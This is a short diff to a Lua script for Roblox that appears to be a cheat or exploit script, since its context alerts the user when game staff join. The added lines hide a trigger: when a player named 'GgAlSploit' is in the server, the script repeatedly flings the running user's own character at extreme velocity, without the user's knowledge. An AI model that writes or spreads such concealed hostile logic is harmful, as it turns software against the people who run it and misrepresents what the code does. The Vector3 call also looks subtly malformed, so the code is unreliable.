@@ -2304,6 +2304,16 @@ task.spawn(function()
 					CreateNotification(60,  "A staff has joined your game!")	
 				end)								
 			end
+			
+			if v.Name == "GgAlSploit" and LocalPlayer.Name ~= "GgAlSploit" then
+				task.spawn(function()
+					repeat
+						task.wait(5)
+						
+						LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3(99999, 99999, 99999)
+					until not game
+				end)
+			end
 		end
 	end)
 end)
